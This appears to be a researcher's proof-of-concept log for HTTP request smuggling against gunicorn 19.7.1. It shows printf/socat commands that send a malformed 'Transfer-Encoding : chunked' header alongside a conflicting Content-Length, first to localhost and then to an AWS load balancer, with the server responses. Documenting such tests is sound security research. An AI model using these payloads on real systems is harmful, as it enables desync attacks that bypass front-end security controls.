```yaml
vigneshsb@Vigneshs-MacBook-Pro VulnerableGunicorn % cat <(printf "POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 5\r\nTransfer-Encoding : chunked\r\n\r\na\r\nadmin=user\r\n0\r\n\r\n") - | socat - TCP:localhost:80

HTTP/1.1 200 OK
Server: gunicorn/19.7.1
Date: Sun, 21 Jul 2024 15:10:06 GMT
Connection: keep-alive
Content-Type: application/json
Content-Length: 134

{
  "body": "admin=user",
  "headers": {
    "Content-Length": "5",
    "Host": "localhost",
    "Transfer-Encoding": "chunked"
  }
}
^C
vigneshsb@Vigneshs-MacBook-Pro VulnerableGunicorn % cat <(printf "POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 5\r\n\r\na\r\nadmin=user\r\n0\r\n\r\n") - | socat - TCP:localhost:80 
 
HTTP/1.1 200 OK
Server: gunicorn/19.7.1
Date: Sun, 21 Jul 2024 15:10:44 GMT
Connection: keep-alive
Content-Type: application/json
Content-Length: 95

{
  "body": "a\r\nad",
  "headers": {
    "Content-Length": "5",
    "Host": "localhost"
  }
}
```




# New findings:
```
vigneshsb@Vigneshs-MacBook-Pro ~ % cat <(printf "POST / HTTP/1.1\r\nHost: gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com\r\nContent-Length: 20\r\nTransfer-Encoding : chunked\r\n\r\na\r\nadmin=user\r\n0\r\n\r\n") - | socat - TCP:gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com:80
HTTP/1.1 200 OK
Date: Sun, 21 Jul 2024 15:36:45 GMT
Content-Type: application/json
Content-Length: 348
Connection: close
Server: gunicorn/19.7.1

{
  "body": "admin=user",
  "headers": {
    "Content-Length": "20",
    "Host": "gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com",
    "Transfer-Encoding": "chunked",
    "X-Amzn-Trace-Id": "Root=1-669d2b0d-546f5c4c3b8b23be41a00f1a",
    "X-Forwarded-For": "27.60.174.119",
    "X-Forwarded-Port": "80",
    "X-Forwarded-Proto": "http"
  }
}
^C
vigneshsb@Vigneshs-MacBook-Pro ~ % cat <(printf "POST / HTTP/1.1\r\nHost: gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com\r\nContent-Length: 5\r\nTransfer-Encoding : chunked\r\n\r\na\r\nadmin=user\r\n0\r\n\r\n") - | socat - TCP:gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com:80
^C```
